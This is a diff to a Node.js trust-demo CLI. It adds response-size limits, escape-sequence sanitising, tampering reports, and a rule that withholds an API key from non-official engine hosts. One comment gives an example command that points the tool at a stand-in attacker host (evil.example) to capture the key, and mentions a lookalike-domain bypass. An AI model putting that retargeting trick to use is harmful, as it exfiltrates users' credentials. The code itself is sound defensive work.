@@ -8,8 +8,10 @@
  * anything. This package is the part an outside developer can actually run.
  *
  * THE ONE LEG THAT NEEDS NOTHING. Step 1 verifies a genuine Plonky3 STARK proof on the
- * machine you are sitting at, using the published @hyperdag/proof-verifier WASM — offline,
- * deterministically, in about a second. It then TAMPERS with the statement and shows the
+ * machine you are sitting at, using the published @hyperdag/proof-verifier WASM — offline
+ * and deterministically. Measured ~65 ms wall clock for all four verifications on an
+ * x86_64 container (1 honest + 3 tampers, including Node startup). It then TAMPERS with
+ * the statement and shows the
  * verifier rejecting it. That is the whole argument of the system reduced to something you
  * can check without trusting us, without a network, and without an account.
  *
@@ -43,17 +45,35 @@ import { readFileSync } from 'node:fs';
 import { fileURLToPath } from 'node:url';
 import path from 'node:path';
 import { verifyProofLocally, missingStatementFields, halRequestHeaders } from '../src/verify-local.mjs';
+import { safe, wasUnsafe } from '../src/safe-output.mjs';
+import { maySendKey } from '../src/engine-trust.mjs';
 
 const HERE = path.dirname(fileURLToPath(import.meta.url));
 const FIXTURES = path.join(HERE, '..', 'fixtures');
+
+// Node 18 and 20 print "ExperimentalWarning: The Fetch API is an experimental feature" on
+// the first fetch. It is noise about Node's own API maturity — it says nothing about what
+// this tool verified — and it lands in the middle of the output on exactly the versions
+// `engines` supports. Suppressed as narrowly as possible: this one warning, by type and
+// message. Every other warning still reaches the user.
+const _emitWarning = process.emitWarning.bind(process);
+process.emitWarning = (warning, ...rest) => {
+  const message = typeof warning === 'string' ? warning : warning?.message ?? '';
+  const type = typeof rest[0] === 'string' ? rest[0] : rest[0]?.type;
+  if (type === 'ExperimentalWarning' && /Fetch API|buffer\.Blob/i.test(message)) return;
+  return _emitWarning(warning, ...rest);
+};
 
 const argv = process.argv.slice(2);
 const has = (n) => argv.includes(`--${n}`);
 const flag = (n, d) => { const i = argv.indexOf(`--${n}`); return i >= 0 && argv[i + 1] ? argv[i + 1] : d; };
 
 if (has('help') || has('h')) {
-  console.log(readFileSync(new URL('./trust-demo.mjs', import.meta.url), 'utf8')
-    .split('\n').slice(1, 36).map((l) => l.replace(/^ \* ?/, '').replace(/^\/\*\*?/, '')).join('\n'));
+  // Bounded by the end of the header comment, not a hard-coded line number: the header
+  // grew past 36 lines once already and silently truncated the exit-code documentation.
+  const src = readFileSync(new URL('./trust-demo.mjs', import.meta.url), 'utf8').split('\n');
+  const end = src.findIndex((l, i) => i > 0 && l.trim() === '*/');
+  console.log(src.slice(1, end).map((l) => l.replace(/^ \* ?/, '').replace(/^ \*$/, '')).join('\n'));
   process.exit(0);
 }
 
@@ -80,14 +100,48 @@ const note = (s) => line(DIM(`           ${s}`));
 
 const result = { engine: ENGINE, agent: AGENT, offline: OFFLINE, legs: {} };
 
+/**
+ * A response bigger than this is not a response, it is a resource-exhaustion attempt.
+ * The largest legitimate payload is a proof of ~15 KB of base64.
+ */
+const MAX_BODY_BYTES = 4 * 1024 * 1024;
+
+/** Records that an engine sent bytes a terminal would have interpreted. */
+const tampering = [];
+
+/** Walk a parsed body and flag any string that carried control characters. */
+function detectTampering(url, value, depth = 0) {
+  if (depth > 6 || tampering.length > 4) return;
+  if (typeof value === 'string') {
+    if (wasUnsafe(value)) tampering.push(url);
+  } else if (Array.isArray(value)) {
+    for (const v of value) detectTampering(url, v, depth + 1);
+  } else if (value && typeof value === 'object') {
+    for (const v of Object.values(value)) detectTampering(url, v, depth + 1);
+  }
+}
+
 /** Keyless GET with a timeout. Never throws — a dead network is a reported gap. */
 async function get(url) {
   const ac = new AbortController();
   const t = setTimeout(() => ac.abort(), TIMEOUT_MS);
   try {
     const res = await fetch(url, { signal: ac.signal, headers: { accept: 'application/json' } });
+
+    // Read as text with a hard ceiling rather than res.json(), so a hostile or broken
+    // engine cannot make this process allocate without bound.
+    const declared = Number(res.headers.get('content-length') ?? '0');
+    if (declared > MAX_BODY_BYTES) {
+      return { status: res.status, json: null, error: `response too large (${declared} bytes)` };
+    }
+    const text = await res.text();
+    if (text.length > MAX_BODY_BYTES) {
+      return { status: res.status, json: null, error: `response too large (${text.length} bytes)` };
+    }
+
     let json = null;
-    try { json = await res.json(); } catch { /* non-JSON body stays null */ }
+    try { json = JSON.parse(text); } catch { /* non-JSON body stays null */ }
+    if (json) detectTampering(url, json);
     return { status: res.status, json };
   } catch (e) {
     return { status: 0, json: null, error: e?.name === 'AbortError' ? `timed out after ${TIMEOUT_MS}ms` : String(e?.message ?? e) };
@@ -183,7 +237,7 @@ step(2, `RepID — ${AGENT}'s live reputation (keyless read)`);
   if (status === 200 && json) {
     const score = json.repid_score ?? json.repid ?? null;
     result.legs.repid = { state: 'REAL', score, tier: json.tier ?? null };
-    ok(`RepID ${score}   tier ${json.tier ?? 'unknown'}`);
+    ok(`RepID ${safe(score)}   tier ${safe(json.tier ?? 'unknown')}`);
   } else {
     result.legs.repid = { state: 'UNKNOWN', reason: error ?? `HTTP ${status}` };
     unk(`could not read RepID — ${error ?? `HTTP ${status}`}`);
@@ -201,7 +255,7 @@ step(3, 'That agent\'s live ZK proof — fetched, then verified locally');
     unk(`no proof returned — ${error ?? `HTTP ${status}`}`);
   } else if (!json.proof_bytes) {
     result.legs.live_proof = { state: 'UNKNOWN', reason: 'legacy stub: no proof bytes', scheme: json.scheme ?? null };
-    unk(`the engine returned a legacy ${json.scheme ?? 'stub'} row with no proof bytes — nothing to verify`);
+    unk(`the engine returned a legacy ${safe(json.scheme ?? 'stub')} row with no proof bytes — nothing to verify`);
   } else {
     const missing = missingStatementFields(json.statement);
     if (missing.length) {
@@ -212,14 +266,14 @@ step(3, 'That agent\'s live ZK proof — fetched, then verified locally');
       const bytes = Buffer.from(json.proof_bytes, 'base64').length;
       if (v.verified) {
         result.legs.live_proof = { state: 'REAL', verified: true, scheme: json.scheme, bytes, statement: json.statement, verifierVersion: v.verifierVersion };
-        ok(`${json.scheme} — ${bytes} bytes fetched, VERIFIED LOCALLY (v${v.verifierVersion})`);
+        ok(`${safe(json.scheme)} — ${bytes} bytes fetched, VERIFIED LOCALLY (v${safe(v.verifierVersion)})`);
         note('we checked the math ourselves. The engine\'s own opinion was not consulted.');
       } else {
         result.legs.live_proof = { state: 'FAIL', verified: false, scheme: json.scheme, bytes, statement: json.statement, reason: v.reason };
         bad(`local verification FAILED — ${v.reason}`);
         note('a proof we could not verify is a gap, never a pass.');
       }
-      if (json.eas?.anchored) note(`EAS attestation ${json.eas.attestation_uid} on ${json.eas.network}`);
+      if (json.eas?.anchored) note(`EAS attestation ${safe(json.eas.attestation_uid)} on ${safe(json.eas.network)}`);
     }
   }
 }
@@ -230,8 +284,9 @@ step(4, 'On-chain — the attestation anchor on Base Sepolia');
   const { status, json, error } = await get(`${ENGINE}/api/v1/observability/onchain-stats`);
   if (status === 200 && json) {
     const w = json.total_writes ?? json.writes ?? json.onchain_writes ?? null;
+    const blob = safe(JSON.stringify(json), 80);
     result.legs.anchor = { state: 'REAL', writes: w, stats: json };
-    ok(`on-chain reputation writes: ${w ?? JSON.stringify(json).slice(0, 80)}`);
+    ok(`on-chain reputation writes: ${w === null ? blob : safe(w)}`);
   } else {
     result.legs.anchor = { state: 'UNKNOWN', reason: error ?? `HTTP ${status}` };
     unk(`anchor stats unavailable — ${error ?? `HTTP ${status}`}`);
@@ -245,7 +300,8 @@ step(5, 'A real settled exchange — the shareable receipt');
 {
   const { status, json, error } = await get(`${ENGINE}/api/v1/receipt/latest.json`);
   if (status === 200 && json) {
-    const url = `${ENGINE}/api/v1/receipt/${json.contract_id ?? 'latest'}`;
+    // contract_id is server-controlled and ends up in a printed URL, so it is sanitised too.
+    const url = `${ENGINE}/api/v1/receipt/${safe(json.contract_id ?? 'latest', 64)}`;
     result.legs.receipt = {
       state: 'REAL',
       contract_id: json.contract_id ?? null,
@@ -254,8 +310,8 @@ step(5, 'A real settled exchange — the shareable receipt');
       paid_before_delivery: json.paid_before_delivery ?? null,
       url,
     };
-    ok(`contract ${String(json.contract_id ?? '').slice(0, 8)} settled for ${json.price_usdc ?? '?'}`);
-    if (json.settlement_url) note(`settlement tx: ${json.settlement_url}`);
+    ok(`contract ${safe(String(json.contract_id ?? '').slice(0, 8))} settled for ${safe(json.price_usdc ?? '?')}`);
+    if (json.settlement_url) note(`settlement tx: ${safe(json.settlement_url)}`);
     // The receipt is deliberately honest about exchanges that paid before delivery.
     if (json.paid_before_delivery === true) note('note: this exchange paid at escrow, BEFORE delivery — the receipt says so rather than smoothing it over.');
     note(`open in a browser (no key needed): ${url}`);
@@ -273,9 +329,28 @@ step(5, 'A real settled exchange — the shareable receipt');
 // so it runs when you have a key (or ask for it with --hal), and otherwise says plainly
 // that it was not consulted. "Not consulted" is a different thing from "passed", and the
 // summary keeps them different.
-const halAuth = halRequestHeaders(process.env);
+// CREDENTIAL SAFETY. halRequestHeaders attaches REPID_API_KEY as a bearer token. `--engine`
+// lets anyone retarget this CLI, so `npx @hyperdag/trust-demo --engine https://evil.example`
+// with the key in the environment would hand that key to a stranger — an exfiltration
+// primitive shipped inside a security demo. The token therefore only travels to the
+// official origin unless the user opts in explicitly for their own deployment.
+// Origin comparison lives in src/engine-trust.mjs so it is unit-tested rather than
+// eyeballed — `…up.railway.app.evil.com` defeats a startsWith check.
+const keyPolicy = maySendKey(ENGINE, { optIn: has('send-key-to-custom-engine') });
+const engineOrigin = keyPolicy.origin;
+const keyAllowedHere = keyPolicy.allowed;
+const rawHalAuth = halRequestHeaders(process.env);
+const halAuth = rawHalAuth.authenticated && !keyAllowedHere
+  ? { headers: { 'content-type': 'application/json' }, authenticated: false }
+  : rawHalAuth;
+const keyWithheld = rawHalAuth.authenticated && !keyAllowedHere;
 const halRequested = halAuth.authenticated || has('hal');
 step(6, 'HAL — cross-provider hallucination quorum (opt-in; needs a key)');
+if (keyWithheld) {
+  unk(`REPID_API_KEY withheld: --engine points at ${safe(engineOrigin ?? ENGINE)}, not the official origin`);
+  note('a key is only sent to the official engine. Pass --send-key-to-custom-engine if that');
+  note('host is genuinely yours. Running keyless instead — never silently, and never leaked.');
+}
 if (!halRequested) {
   result.legs.hal = { state: 'SKIPPED', reason: 'not requested — no REPID_API_KEY and no --hal' };
   note('not consulted. This leg needs REPID_API_KEY to bypass the public per-IP cap.');
@@ -312,7 +387,11 @@ if (!halRequested) {
       const halScore = j.halScore ?? j.hal_score ?? null;
       result.legs.hal = { state: 'REAL', verdict, halScore, mode: j.mode ?? null, calibrated: false };
       const vetoed = /veto/i.test(String(verdict));
-      (vetoed ? bad : ok)(`verdict ${verdict}   halScore ${halScore}   mode ${j.mode ?? '?'}`);
+      // A VETO is HAL WORKING — the default claim is deliberately false, so catching it is
+      // the success case. Rendering it with bad() painted it red as "FAIL", which collides
+      // with FAIL-the-leg-state and tells the reader the opposite of what happened.
+      ok(`verdict ${safe(verdict)}   halScore ${safe(halScore)}   mode ${safe(j.mode ?? '?')}`);
+      if (vetoed) note('VETO = the quorum caught the false claim. That is the system working, not a failure.');
       // LESSONS #8: a measurement without its ruler is not a result. The raw halScore is
       // NOT a probability — on the frozen holdout, cases scoring 0.50 were hallucinations
       // 83-88% of the time. Calibration needs the frozen calibrator artefact, which lives
@@ -322,7 +401,7 @@ if (!halRequested) {
       note('for the calibrated P(hallucination) with its ruler, run scripts/demo/trust-harness-e2e.mjs');
       if (Array.isArray(j.evidence) && j.evidence.length) {
         note('per-provider evidence:');
-        for (const e of j.evidence.slice(0, 5)) note(`  - ${e}`);
+        for (const e of j.evidence.slice(0, 5)) note(`  - ${safe(e)}`);
       }
     }
   } catch (e) {
@@ -368,6 +447,11 @@ function finish() {
     scope,
   };
 
+  // Say it out loud. A sanitised attack is still an attack, and quietly cleaning up after
+  // a hostile engine would be exactly the "hide the gap" behaviour this demo exists to
+  // refuse. The output was made safe; the attempt is still news.
+  result.tampering_detected = [...new Set(tampering)];
+
   if (AS_JSON) {
     console.log(JSON.stringify(result, null, 2));
   } else {
@@ -388,6 +472,13 @@ function finish() {
       line('');
       note('not attempted:');
       for (const [k, l] of skipped) note(`  - ${k}: ${l.reason}`);
+    }
+    if (result.tampering_detected.length) {
+      line('');
+      line(`  ${RED('!!')} this engine sent terminal escape sequences in ${result.tampering_detected.length} response(s).`);
+      note('they were stripped before printing, so what you read above is what arrived.');
+      note('a legitimate engine has no reason to do this. Treat this deployment as hostile:');
+      for (const u of result.tampering_detected) note(`  - ${safe(u)}`);
     }
     line('');
     note(result.summary.scope);
